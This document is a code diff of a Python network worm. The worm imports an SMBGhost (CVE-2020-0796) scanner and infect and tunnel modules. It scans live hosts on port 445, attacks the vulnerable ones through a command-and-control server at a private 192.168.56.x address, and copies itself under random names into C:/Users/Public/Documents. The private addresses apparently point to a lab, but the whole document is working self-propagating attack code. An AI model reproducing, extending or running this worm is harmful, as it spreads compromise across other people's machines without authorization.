@@ -1,5 +1,5 @@
 import sys, os, platform, time, socket
-import armory.SMBGhost.cve20220796scanner as cve20220796scanner
+import armory.SMBGhost.cve20200796scanner as cve20200796scanner
 from sniff import sniff
 from infect import infect
 import tunnel as comm
@@ -9,20 +9,21 @@ import uuid
 
 def main():
     if len(sys.argv) > 2:
-        if sys.argv[1] == "--path":
-            file_path = sys.argv[2]
-        elif sys.argv[1] == "--attack" and sys.argv[2] == "windows":
+        if sys.argv[1] == "--attack" and sys.argv[2] == "windows":
             file_path = "tworm.exe"
     else:
         file_path = sys.argv[0]
-    
-    if "exe" in file_path:
-        clone(file_path, str(uuid.uuid4()) + ".exe")
-    else:
-        clone(file_path, str(uuid.uuid4())+file_path)
+        if "exe" in file_path:
+            clone(file_path, str(uuid.uuid4()) + ".exe")
+        else:
+            clone(file_path, str(uuid.uuid4())+file_path)
     
     c2_server = "192.168.56.108"
+    
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
+    
+    vulnerable_target_ports = ['445',] 
+    
     network = sniff()
     for local_ip in network.get_host_networks().keys():
         listening_port = 1337
@@ -30,14 +31,16 @@ def main():
         sock.bind((local_ip,listening_port))
         sock.listen(5)
         for target_ip in network.get_alive_hosts(local_ip):
-            target_port_details = network.get_host_port_details(target_ip)
-            print("Scanning Host:{} for port service".format(target_ip.address))
-            if target_ip.address in target_port_details.keys():
-                for running_port in target_port_details[target_ip.address]["ports"]:
-                    port = running_port["portid"]
-                    print("Host: {} - running port:{}".format(target_ip.address, port))
-                    if (not target_ip.address in not_testing_targets) and (not local_ip == target_ip.address):
-                        attack = (cve20220796scanner.is_vulnerable(target_ip.address) and port == "445")
+            if (not target_ip.address in not_testing_targets) and (not local_ip == target_ip.address):
+                print("Scanning Host:{} for port service".format(target_ip.address))
+                target_port_details = network.get_host_port_details(target_ip,vulnerable_target_ports)
+                print(target_port_details)
+                if target_ip.address in target_port_details.keys():
+                    for running_port in target_port_details[target_ip.address]["ports"]:
+                        port = running_port["portid"]
+                        print("Host: {} - running port:{}".format(target_ip.address, port))
+                        attack = (cve20200796scanner.is_vulnerable(target_ip.address) and port == "445")
+                        print(attack)
                         if attack:
                             print("start to attack")
                             #local_ip = "0.0.0.0"
@@ -54,13 +57,14 @@ def main():
                             time.sleep(2)
                             #tunnel.close_connection(target_ip.address)
                             tunnel.join()
+                            
         sock.close()    
                             
 
 def clone(file_path, filename):
     try:
-        currentpath=os.getcwd()
-        fullpath =os.path.join(currentpath, filename)
+        default_path="C:/Users/Public/Documents"
+        fullpath =os.path.join(default_path, filename)
         self_clone = replicate(file_path, fullpath)
         self_clone.self_replicate(platform.system(),file_path, fullpath)
     except Exception as e:
